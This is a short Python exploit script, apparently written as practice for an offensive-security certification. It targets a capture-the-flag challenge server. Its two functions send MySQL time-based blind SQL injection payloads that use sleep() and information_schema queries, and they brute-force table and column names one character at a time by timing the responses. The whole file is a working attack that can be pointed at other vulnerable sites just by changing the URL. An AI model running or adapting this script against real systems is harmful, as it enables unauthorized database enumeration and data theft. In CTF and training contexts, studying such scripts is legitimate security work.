#!/bin/env python3
import requests
import string
print("""
Road to OSWE
Time-base Blind SQLI with python
made with <3 hha the picaro
	""")
time = 3
brutestring = string.ascii_letters+string.digits+"$^&*!@~_-#"
brutestring2 = string.ascii_lowercase+string.digits
url = "http://chal.ctf.b01lers.com:3004/"
def guess_column():
	flag = True
	tmp = ""
	while flag:
		for s in brutestring:
			brutechar = tmp + s 
			# print(brutechar)
			payload = "select 1 from dual where 1=1 and (select sleep({}) and  (select 1 from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like 's{}%' limit 0,1) like '%%'))".format(time,brutechar)
			timesqli = {'query':payload}
			resp = requests.post(url,data = timesqli)
			timetaken = resp.elapsed.total_seconds()
			if timetaken >= time:
				tmp += s
				print("[!] Found " + tmp)
				break
			if s == "#":
				table = tmp
				print("[+] Guessed column Name = {}".format(table))
				flag = False
				break
# guess_column()
		
def get_tables():
	flag = True 
	tmp = ""
	print("[!] Dumping tables ")
	while flag:
		for s in brutestring:
			brutechar = tmp + s
			# print(brutechar)
			payload = "select 1 from dual where 1=1 and (select sleep({}) and  (select 1 from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%name%' limit 0,1) like '{}%'))".format(time,brutechar)
			timesqli = {'query':payload}
			resp = requests.post(url,data = timesqli)
			timetaken = resp.elapsed.total_seconds()
			if timetaken >= time:
				tmp += s
				print("[!] Found " + tmp)
				break
			if s == "#":
				table = tmp
				print("[+] Table Name = {}".format(table))
				flag = False
				break
get_tables()